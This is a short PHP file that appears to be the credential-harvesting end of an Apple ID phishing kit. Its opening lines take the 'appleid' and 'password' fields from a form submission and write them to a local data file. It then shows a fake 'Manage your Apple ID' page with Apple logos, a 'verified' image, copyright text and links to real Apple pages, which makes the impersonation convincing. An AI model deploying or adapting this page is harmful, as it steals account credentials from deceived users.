<?php

$var1 = $_POST['appleid'];
$var2 = $_POST['password'];

$fileHandle = fopen("myDataFile", 'w');
fwrite($fileHandle, $var1);
fwrite($fileHandle, $var2);
fclose($fileHandle);

$fileHandle = fopen("myDataFile", 'r');
$theInfo = fgets($fileHandle);
fclose($fileHandle);

echo '<html>


<head>
	
	<title>Manage your Apple ID</title>
	<link rel="icon" type="image/png" href="images/apple_logo_web.png" />
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<center>
	<div class="container-fluid">
		<div class="banner">
		<center><image src="images/apple_id_mobile.jpg" id="background" name="background"/><center>
		</div>
	</div>
	</center>
	
<link rel="stylesheet" href="style.css" type="text/css" media="screen"  />

</head>

<body>
	<center>
	<div id="container">
		<img src="images/verified.png" id="verified">
	</div>
	<div>
		<img src="images/apps_mobile.png" name="apps" id="apps">
	</center>
	</div>
</body>

<tr id="footer"><center>
	<td class="footer background iPhone_font">
		<span class="bottomContent">
            <span class="footer1" style="white-space: nowrap;">
                Copyright &copy; 2017 Apple Inc.
            </span>
            <span class="footer1" style="white-space: nowrap;">
                All rights reserved.
            </span>
        </span>
		<div>
		<span class="footer1" style="white-space: nowrap;">
			<a href="https://appleid.apple.com/choose-your-country/" style="color: #08c; text-decoration: none;">
					My Apple ID
            </a>
        </span> |  
        <span class="footer1" style="white-space: nowrap;">
            <a href="http://www.apple.com/support/country/" style="color: #08c; text-decoration: none;">
                    Support
            </a>
        </span> | 
        <span class="footer1" style="white-space: nowrap;">
            <a href="http://www.apple.com/legal/internet-services/privacy/" style="color: #08c; text-decoration: none;">
                Privacy Policy
            </a>
        </span>
		</div>
        <br>
    </td>
</tr></center>

</html>';

?>